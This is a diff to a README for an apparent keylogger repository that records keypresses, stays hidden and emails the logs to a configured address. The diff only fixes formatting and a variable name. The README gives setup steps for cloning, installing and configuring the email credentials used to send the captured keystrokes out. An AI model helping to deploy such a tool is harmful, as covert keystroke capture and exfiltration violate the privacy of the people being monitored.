@@ -2,13 +2,13 @@
 Records keypresses, sends emails to user and remains hidden
 
 ## Clone the repository
-git clone https://github.com/prashantsengar/keylogger
+`git clone https://github.com/prashantsengar/keylogger`
 
 ## Install requirements
 `pip install -r requirements.txt`
 
 ### Configure script
-- Edit `fromadd` to your email address
+- Edit `fromaddr` to your email address
 - Edit `frompass` to your password
 - Change `toaddr` to the email address you want the logs to be sent
 - Change `sub` to the subject of the email
